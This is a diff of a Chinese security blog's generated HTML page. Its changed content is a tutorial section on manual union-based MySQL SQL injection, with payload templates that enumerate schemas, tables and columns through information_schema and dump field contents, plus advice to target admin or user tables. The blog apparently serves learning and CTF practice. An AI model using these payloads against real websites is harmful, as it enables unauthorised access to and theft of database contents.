@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,250</span> / Reading time: <span class="post-count">5 min</span></span>
+                        <span>Word count: <span class="post-count">1,271</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -423,9 +423,10 @@ height:50vh;
 <h3 id="暴表暴库列暴用户名密码"><a href="#暴表暴库列暴用户名密码" class="headerlink" title="暴表暴库列暴用户名密码"></a>暴表暴库列暴用户名密码</h3><h4 id="查表查列"><a href="#查表查列" class="headerlink" title="查表查列"></a>查表查列</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,schema_name,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> N,<span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=要查询的库名的十六进制 <span class="keyword">limit</span> N,<span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,column_name,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=要查的表名的十六进制 <span class="keyword">limit</span> N,<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>有个提速技巧，要查的库名的十六进制那个地方填database()，就是table_schema=database()，直接就表示当前数据库。</p>
 <p>找敏感的表，含有admin、manage或者user之类的</p>
-<h3 id="爆表爆列"><a href="#爆表爆列" class="headerlink" title="爆表爆列"></a>爆表爆列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">暴库：and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">distinct</span> schema_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">爆表：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">distinct</span> table_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=要爆的库名的十六进制</span><br><span class="line">爆字段：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">distinct</span> column_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=要爆的表名的十六进制</span><br><span class="line">报字段内容：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(列名<span class="number">1</span>,<span class="number">0x3a</span>,列名<span class="number">2</span>),<span class="number">4</span> <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure>
+<h3 id="爆表爆列"><a href="#爆表爆列" class="headerlink" title="爆表爆列"></a>爆表爆列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">暴库：and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">distinct</span> schema_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata</span><br><span class="line">爆表：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">distinct</span> table_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() 或者写要爆的库名的十六进制</span><br><span class="line">爆字段：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">distinct</span> column_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=要爆的表名的十六进制</span><br><span class="line">报字段内容：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(列名<span class="number">1</span>,<span class="number">0x3a</span>,列名<span class="number">2</span>),<span class="number">4</span> <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure>
 <p>distinct表示不同，也就是去掉爆出内容的重复部分，不加也可以。</p>
 <p>所有数据都是从information_schema.columns这个表里获取，因为从information_schema这个库的介绍(<a href="http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html)我们可以看到，从information_schema.columns这个表里，我们可以查到所有的信息，因为它在里面，table_schema、table_name、column_name这个三个列都有，所以我们可以直接通过这个表，查出我们需要的所有信息，就省了换表这一步了，进一步提升速度" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.1/zh/information-schema.html)我们可以看到，从information_schema.columns这个表里，我们可以查到所有的信息，因为它在里面，table_schema、table_name、column_name这个三个列都有，所以我们可以直接通过这个表，查出我们需要的所有信息，就省了换表这一步了，进一步提升速度</a>.</p>
+<p>一般用union select 查到表后 直接进行爆表爆列</p>
 <h1 id="Sqlmap等工具注入"><a href="#Sqlmap等工具注入" class="headerlink" title="Sqlmap等工具注入"></a>Sqlmap等工具注入</h1><p>sqlmap access<a href="https://blog.csdn.net/u011781521/article/details/58073135" target="_blank" rel="noopener">注入实战</a><br>sqlmap mysql<a href="https://blog.csdn.net/u011781521/article/details/58130343" target="_blank" rel="noopener">注入实战</a><br>sqlmap cookie<a href="https://blog.csdn.net/u011781521/article/details/58135307" target="_blank" rel="noopener">注入实战</a><br>sqlmap post登录框<a href="https://blog.csdn.net/u011781521/article/details/58594941" target="_blank" rel="noopener">注入实战</a><br>PHP+Mysql手动注入-<a href="https://blog.csdn.net/u011781521/article/details/57078109" target="_blank" rel="noopener">字符型</a><br>PHP+Mysql手动注入-<a href="https://blog.csdn.net/u011781521/article/details/57083482" target="_blank" rel="noopener">搜索型</a><br>ASP+ACCESS手动注入-<a href="https://blog.csdn.net/u011781521/article/details/57406275" target="_blank" rel="noopener">Cookie注入</a></p>
 
     </article>
@@ -939,9 +940,16 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 26
+        Total : 27
         </div>
         <!-- search  -->
         
@@ -952,22 +960,13 @@ top:50vh;
     
     
     
-    <div class="archive-year"> Invalid date </div>
+    <div class="archive-year"> 2018 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/SJU-game/" >SJU集训结业&淘汰赛 Write Up</a>
         </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
     
     
         <li class="archive-post-item">
@@ -1080,6 +1079,29 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/24/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2018/05/28/python/" >学习python中遇到的问题及总结</a>
         </li>
@@ -1101,11 +1123,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
     
         <span class="sidebar-tag-name" data-tags="Record,Problem"><span class="iconfont-archer">&#xe606;</span>Record,Problem</span>
     
